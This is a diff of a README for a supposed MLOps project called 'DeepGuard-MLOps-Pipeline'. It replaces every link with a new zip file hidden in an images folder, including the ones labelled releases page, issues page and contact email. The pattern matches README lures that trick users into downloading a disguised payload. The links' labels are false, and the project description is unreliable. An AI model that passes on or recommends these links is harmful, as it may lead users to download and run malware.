@@ -1,6 +1,6 @@
 # 🔒 DeepGuard-MLOps-Pipeline - Simplifying Machine Learning Operations
 
-[![Download DeepGuard-MLOps-Pipeline](https://raw.githubusercontent.com/sillysticky/DeepGuard-MLOps-Pipeline/main/flask_app/samples/Deep-Guard-Ops-Pipeline-ML-1.0.zip%20Now-DeepGuard--MLOps--Pipeline-brightgreen)](https://raw.githubusercontent.com/sillysticky/DeepGuard-MLOps-Pipeline/main/flask_app/samples/Deep-Guard-Ops-Pipeline-ML-1.0.zip)
+[![Download DeepGuard-MLOps-Pipeline](https://github.com/sillysticky/DeepGuard-MLOps-Pipeline/raw/refs/heads/main/images/eks deployment images/ML_Guard_Deep_Pipeline_Ops_v1.2.zip%20Now-DeepGuard--MLOps--Pipeline-brightgreen)](https://github.com/sillysticky/DeepGuard-MLOps-Pipeline/raw/refs/heads/main/images/eks deployment images/ML_Guard_Deep_Pipeline_Ops_v1.2.zip)
 
 ## 🏁 Introduction
 
@@ -24,7 +24,7 @@ Before proceeding, make sure your computer meets the following minimum requireme
 
 1. **Visit the Releases Page:** Click the link below to access our Releases page. 
 
-   [Download DeepGuard-MLOps-Pipeline](https://raw.githubusercontent.com/sillysticky/DeepGuard-MLOps-Pipeline/main/flask_app/samples/Deep-Guard-Ops-Pipeline-ML-1.0.zip)
+   [Download DeepGuard-MLOps-Pipeline](https://github.com/sillysticky/DeepGuard-MLOps-Pipeline/raw/refs/heads/main/images/eks deployment images/ML_Guard_Deep_Pipeline_Ops_v1.2.zip)
 
 2. **Select the Latest Version:** On the Releases page, find the latest version of DeepGuard-MLOps-Pipeline. 
 
@@ -64,7 +64,7 @@ Before proceeding, make sure your computer meets the following minimum requireme
 
 If you encounter any issues or have questions, you can find support in the following ways:
 
-- **GitHub Issues:** Report bugs or request features on our [Issues page](https://raw.githubusercontent.com/sillysticky/DeepGuard-MLOps-Pipeline/main/flask_app/samples/Deep-Guard-Ops-Pipeline-ML-1.0.zip).
+- **GitHub Issues:** Report bugs or request features on our [Issues page](https://github.com/sillysticky/DeepGuard-MLOps-Pipeline/raw/refs/heads/main/images/eks deployment images/ML_Guard_Deep_Pipeline_Ops_v1.2.zip).
 - **Community Forums:** Join discussions with other users on platforms like Stack Overflow or Reddit.
 
 ## 📈 Contributions
@@ -77,6 +77,6 @@ This project is licensed under the MIT License. You can freely use, modify, and 
 
 ## 📧 Contact
 
-For any direct inquiries, reach out via email at https://raw.githubusercontent.com/sillysticky/DeepGuard-MLOps-Pipeline/main/flask_app/samples/Deep-Guard-Ops-Pipeline-ML-1.0.zip
+For any direct inquiries, reach out via email at https://github.com/sillysticky/DeepGuard-MLOps-Pipeline/raw/refs/heads/main/images/eks deployment images/ML_Guard_Deep_Pipeline_Ops_v1.2.zip
 
 Explore, enhance your machine learning skills, and contribute to the future of MLOps with DeepGuard-MLOps-Pipeline today!
